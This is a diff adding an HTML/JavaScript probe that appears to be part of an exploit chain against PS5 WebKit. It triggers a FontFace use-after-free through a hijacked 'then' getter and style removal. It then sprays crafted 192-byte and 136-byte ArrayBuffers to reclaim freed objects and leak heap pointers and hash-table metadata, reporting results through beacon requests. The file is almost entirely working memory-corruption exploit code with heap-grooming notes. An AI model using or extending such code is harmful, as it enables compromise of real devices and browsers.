@@ -1,0 +1,280 @@
+<!--
+  p586: HashTable grow measurement via wrapper churn.
+
+  Tests whether 3 rounds of wrapper churn (load/drop/GC) on a CSS-connected
+  FontFace grows the WeakHashSet m_clients table from 8 to 16 slots.
+
+  Theory (cobrajet302gt, issue #181):
+    - Fresh table = 8 slots (80B: 16B metadata prefix + 8*8B entries)
+    - Expand threshold: (keyCount + deletedCount) * 4 >= tableSize * 3
+    - 3 live clients + 3 tombstones = 6, trips 75% load factor on 8-slot table
+    - Doubles to 16 slots -> zeroedMalloc(144B)
+    - 144B hole admits spray requests of 129-144B
+
+  JS route: document.fonts.load() materializes wrapper -> addClient.
+  Drop JS ref + GC -> ~FontFace -> removeClient -> tombstone (deletedCount++).
+  3 rounds: 3 live + 3 deleted = 6 -> trips expand.
+
+  Measurement strategy (we can't follow pointers from JS):
+    1. After churn, trigger UAF and spray 192B (reclaim face)
+    2. Read +0x58 in hit buffer (table pointer — different addr = different alloc = grew)
+    3. Spray 136B ArrayBuffers to reclaim the freed table hole
+    4. If table grew to 16 slots (144B alloc), a 136B buffer may land in it
+    5. Table metadata layout at allocation start:
+       offset 0-3:   deletedCount
+       offset 4-7:   keyCount
+       offset 8-11:  tableSizeMask (= tableSize - 1)
+       offset 12-15: tableSize (expect 16 if grown, 8 if not)
+       offset 16+:   entries (8B each, heap pointers or 0)
+    6. Scan 136B pool for buffers where offset 12 = 8 or 16
+
+  Also runs a CONTROL: p581-style dump of the face without churn would show
+  +0x58 pointing to an 80B table (8 slots). Here with churn, if the pointer
+  changed and the 136B pool has tableSize=16, the grow is confirmed.
+
+  NOTE on GC: PS5 WebKit has no window.gc(). We force GC by allocating and
+  abandoning large typed arrays. The wrapper should be collected if no JS
+  reference holds it and no promise pins it. We use a DIFFERENT face for
+  churn (the 'sa' style face) and the UAF target (the 'pa' programmatic face)
+  — actually, the churn must happen on the SAME face whose table we measure.
+
+  Revised approach: use ONE CSS-connected face ('sa' via <style>). Churn on
+  it by calling document.fonts.load('1em sa') repeatedly, dropping the
+  returned FontFace refs between rounds. Then trigger UAF via the same
+  getter + style-remove recipe. The 'pa' face is just for the then-trap.
+
+  Actually, re-reading the source: document.fonts.load() finds matching faces
+  and calls wrapper() on each. The wrapper() call on a CSS-connected face
+  does addClient. So we churn by calling load(), capturing the result FontFace
+  object (which IS the wrapper), dropping it, forcing GC, repeating.
+
+  Expected beacons:
+    G              = probe start
+    CHURN_<n>      = churn round n complete
+    GC_<n>         = GC pressure round n complete
+    F              = font freed inside getter
+    S192=<n>       = 192B spray done
+    S136=<n>       = 136B spray done
+    FACE_H<i>,rc=<d>,T=<hex>,W=<hex>  = face hit at buffer i
+    FACE_MISS      = no face hit
+    TBL_H<i>,ts=<d>,kc=<d>,dc=<d>,tm=<d> = table hit at buffer i
+    TBL_MISS       = no table hit in 136B pool
+    ALIVE / ALIVE2 = survival markers
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p</title>
+<style id="v">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+
+/* Force GC: allocate+abandon large typed arrays */
+function forceGC(){
+  for(var i=0;i<64;i++){var a=new ArrayBuffer(1024*1024);void new Uint8Array(a);}
+}
+
+/* Churn round: load -> capture wrapper -> drop -> GC */
+var churnRound=0;
+var churnDone=false;
+
+function doChurn(cb){
+  if(churnRound>=3){churnDone=true;cb();return;}
+  var r=churnRound;
+  /* load() finds the CSS-connected 'sa' face and materializes its wrapper.
+     The returned promise resolves with an array of FontFace objects.
+     Each FontFace IS the wrapper. addClient fires on wrapper(). */
+  document.fonts.load('1em sa','B').then(function(faces){
+    /* faces[0] is the wrapper. Drop it. */
+    b('CHURN_'+(r+1)+'_faces='+faces.length);
+    faces=null;
+    /* Force GC to collect the wrapper -> removeClient -> tombstone */
+    setTimeout(function(){
+      forceGC();
+      b('GC_'+(r+1));
+      churnRound++;
+      /* Next round after a beat for GC to settle */
+      setTimeout(function(){doChurn(cb);},50);
+    },50);
+  },function(err){
+    /* load() can reject if font fails — still churn happened */
+    b('CHURN_'+(r+1)+'_ERR');
+    setTimeout(function(){
+      forceGC();
+      b('GC_'+(r+1));
+      churnRound++;
+      setTimeout(function(){doChurn(cb);},50);
+    },50);
+  });
+}
+
+function main(){
+b('G');
+
+/* Pre-churn: first call materializes the wrapper (client #4).
+   Then 3 churn rounds add 3 more tombstones.
+   Before churn starts, the face already has 3 built-in clients:
+     1. CSSFontSelector (born with the face)
+     2. CSSSegmentedFontFace (from segmented insertion)
+     3. (maybe not — depends on whether the <style> face gets segmented)
+   The JS wrapper is client #3 or #4. Each churn round:
+     - load() re-materializes wrapper -> addClient (new entry)
+     - drop + GC -> removeClient -> tombstone (deletedCount++)
+   After 3 rounds: keyCount(live) + deletedCount(tombs) may reach 6.
+*/
+
+doChurn(function(){
+  b('CHURN_DONE');
+  /* Now trigger the UAF on the same face via the getter recipe */
+  triggerUAF();
+});
+}
+
+function triggerUAF(){
+/* 'pa' is a programmatic face just for the then-trap timing.
+   The actual target is the CSS-connected 'sa' face in <style id="v">. */
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;window._r=[pa];
+
+var fired=0;
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){if(fired)return;fired=1;
+/* Dirty the cascade by removing the style -> arms the purge */
+var el=document.getElementById('v');
+if(el)el.remove();
+try{document.fonts.delete(this);}catch(e){}
+/* Force layout -> triggers cascade rebuild -> purges 'sa' face -> frees CSSFontFace */
+document.body.offsetHeight;
+b('F');
+
+/* Spray 192B to reclaim the freed CSSFontFace (192 bytes) */
+var face192=[];
+for(var i=0;i<2048;i++){
+  var u=new Uint8Array(new ArrayBuffer(192));
+  /* vincenzoiacovone safety fields */
+  wD(u,0x00,2);          /* rc=2, engine bumps to 3 on hit */
+  wD(u,0x60,0);          /* opCount=0 */
+  wD(u,0x64,0xFFFFFFFF); /* maxOp=max (prevent cleanup) */
+  u[0x82]=3;             /* Status::Success (pump is no-op) */
+  face192.push(u);
+}
+b('S192='+face192.length);
+window._f=face192;
+
+/* Spray 136B to try to reclaim the freed HashTable.
+   If table grew to 16 slots: alloc was 144B.
+   bmalloc class law: 129-144B requests fit in that hole.
+   136B < 144B, so it should land.
+   If table stayed at 8 slots: alloc was 80B.
+   136B does NOT fit in an 80B hole -> TBL_MISS expected.
+   Fill with sentinel 0xCC so we can detect any write. */
+var tbl136=[];
+for(var j=0;j<1024;j++){
+  var t=new Uint8Array(new ArrayBuffer(136));
+  for(var k=0;k<136;k++)t[k]=0xCC;
+  tbl136.push(t);
+}
+b('S136='+tbl136.length);
+window._t=tbl136;
+
+return;},set:function(){}});
+
+/* Trigger: load both faces. The getter fires inside the promise chain.
+   'sa' is the CSS face with the churned table.
+   'pa' is just for the then-trap. */
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+/* Scan timers */
+setTimeout(function(){scanFace('A');scanTable('A');},60);
+setTimeout(function(){scanFace('B');scanTable('B');},400);
+setTimeout(function(){scanFace('C');scanTable('C');},1000);
+setTimeout(function(){b('ALIVE');},500);
+setTimeout(function(){b('ALIVE2');},2000);
+}
+
+/* Scan 192B pool for reclaimed CSSFontFace */
+function scanFace(tag){
+  var lane=window._f;if(!lane)return;
+  var hi=window._fhi;
+  if(hi===undefined){
+    for(var i=0;i<lane.length;i++){
+      var v=lane[i],rc=rD(v,0);
+      if(rc!==2){window._fhi=i;hi=i;break;}
+      var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+      if(t0){window._fhi=i;hi=i;break;}
+    }
+  }
+  if(hi===undefined){b(tag+'FACE_MISS');return;}
+  var v=lane[hi];
+  var rc=rD(v,0);
+  var T=rQ(v,0x58),W=rQ(v,0x68);
+  b(tag+'FACE_H'+hi+',rc='+rc+',T='+T+',W='+W);
+  /* Dump all 24 qwords for full characterization */
+  var d='';for(var q=0;q<8;q++)d+=rQ(v,q*8)+'.';
+  b(tag+'FD0:'+d);
+  d='';for(var q=8;q<16;q++)d+=rQ(v,q*8)+'.';
+  b(tag+'FD1:'+d);
+  d='';for(var q=16;q<24;q++)d+=rQ(v,q*8)+'.';
+  b(tag+'FD2:'+d);
+}
+
+/* Scan 136B pool for reclaimed HashTable (metadata at start of allocation).
+   Layout of a 16-slot table (144B alloc, we reclaim with 136B):
+     +0x00: deletedCount (u32)
+     +0x04: keyCount     (u32)
+     +0x08: tableSizeMask (u32) = tableSize - 1
+     +0x0C: tableSize    (u32) = 8 (default) or 16 (grown)
+     +0x10: entries[0..15] (8B each, heap ptrs or 0/tombstone)
+
+   Detection heuristic: tableSize is 8 or 16, tableSizeMask = tableSize-1,
+   keyCount > 0, deletedCount >= 0, and not all 0xCC (our sentinel).
+   Also: entries should be heap pointers (0x1000xxxxxxxx range) or 0/-1. */
+function scanTable(tag){
+  var pool=window._t;if(!pool)return;
+  var hi=window._thi;
+  if(hi===undefined){
+    for(var i=0;i<pool.length;i++){
+      var v=pool[i];
+      /* Check if sentinel was overwritten at all */
+      if(v[0]===0xCC&&v[1]===0xCC&&v[2]===0xCC&&v[3]===0xCC)continue;
+      /* Read candidate metadata */
+      var ts=rD(v,0x0C); /* tableSize */
+      var tm=rD(v,0x08); /* tableSizeMask */
+      var kc=rD(v,0x04); /* keyCount */
+      var dc=rD(v,0x00); /* deletedCount */
+      /* Plausibility: tableSize is power of 2, mask = size-1 */
+      if((ts===8||ts===16||ts===32)&&tm===(ts-1)&&kc<=ts&&dc<=ts){
+        window._thi=i;hi=i;break;
+      }
+    }
+  }
+  if(hi===undefined){
+    /* No plausible table found. Report first non-sentinel buffer for debug. */
+    for(var i=0;i<pool.length;i++){
+      var v=pool[i];
+      if(v[0]!==0xCC||v[4]!==0xCC||v[8]!==0xCC||v[12]!==0xCC){
+        var ts=rD(v,0x0C),kc=rD(v,0x04),dc=rD(v,0x00),tm=rD(v,0x08);
+        b(tag+'TBL_RAW'+i+',ts='+ts+',kc='+kc+',dc='+dc+',tm='+tm);
+        /* Dump first 32 bytes as hex */
+        var d='';for(var q=0;q<4;q++)d+=rQ(v,q*8)+'.';
+        b(tag+'TD:'+d);
+        return;
+      }
+    }
+    b(tag+'TBL_MISS');
+    return;
+  }
+  var v=pool[hi];
+  var ts=rD(v,0x0C),kc=rD(v,0x04),dc=rD(v,0x00),tm=rD(v,0x08);
+  b(tag+'TBL_H'+hi+',ts='+ts+',kc='+kc+',dc='+dc+',tm='+tm);
+  /* Dump first 64B: metadata + first 6 entries */
+  var d='';for(var q=0;q<4;q++)d+=rQ(v,q*8)+'.';
+  b(tag+'TD0:'+d);
+  d='';for(var q=4;q<8;q++)d+=rQ(v,q*8)+'.';
+  b(tag+'TD1:'+d);
+}
+
+setTimeout(main,0);
+</script></head><body>p</body></html>
